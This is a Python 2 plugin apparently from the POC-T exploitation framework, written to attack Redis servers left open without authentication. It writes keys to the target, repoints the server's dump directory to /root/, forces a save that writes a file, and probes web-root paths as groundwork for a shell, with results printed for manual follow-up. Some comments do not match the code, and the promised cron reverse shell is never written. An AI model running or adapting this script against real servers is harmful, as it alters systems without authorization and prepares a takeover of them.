#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
redis getshell expliot (/var/spool/cron reverse shell)

检查Redis未授权访问->检查是否存在web服务->检查exp必需的权限和功能->枚举绝对路径->输出结果供手工测试

"""

import redis
from plugin.util import host2IP
from plugin.util import randomString
from plugin.util import redirectURL
from plugin.util import checkPortTcp
from plugin.static import ABSPATH_PREFIXES, ABSPATH_SUFFIXES


def poc(url):
    url = host2IP(url)
    ip = url.split(':')[0]
    port = int(url.split(':')[-1]) if ':' in url else 6379

    for web_port in [80, 443, 8080, 8443]:  # 判断web服务
        if checkPortTcp(ip, web_port):
            try:
                real_url = redirectURL(ip + ':' + str(web_port))
            except Exception:
                real_url = ip + ':' + str(web_port)
            break  # TODO 这里简单化处理,只返回了一个端口的结果
    else:
        return False

    try:
        r = redis.Redis(host=ip, port=port, db=0, socket_timeout=5)
        if 'redis_version' not in r.info():  # 判断未授权访问
            return False
        key = randomString(5)
        value = randomString(5)
        r.set(key, value)  # 判断可写
        r.config_set('dir', '/root/')  # 判断对/var/www的写入权限(目前先判断为root)
        r.config_set('dbfilename', 'dump.rdb')  # 判断操作权限
        r.delete(key)
        r.save()  # 判断可导出
    except Exception, e:
        return False

    # 枚举绝对路径
    path_list = []
    for each in ABSPATH_PREFIXES.LINUX:
        try:
            r.config_set('dir', each.rstrip('/'))
            path_list.append(each)
            for suffix in ABSPATH_SUFFIXES:
                try:
                    r.config_set('dir', suffix.rstrip('/'))
                    path_list.append(each.rstrip('/') + '/' + suffix)
                except Exception:
                    continue
        except Exception:
            continue

    if len(path_list):
        return real_url + ' ' + ' '.join(path_list)
    else:
        return False
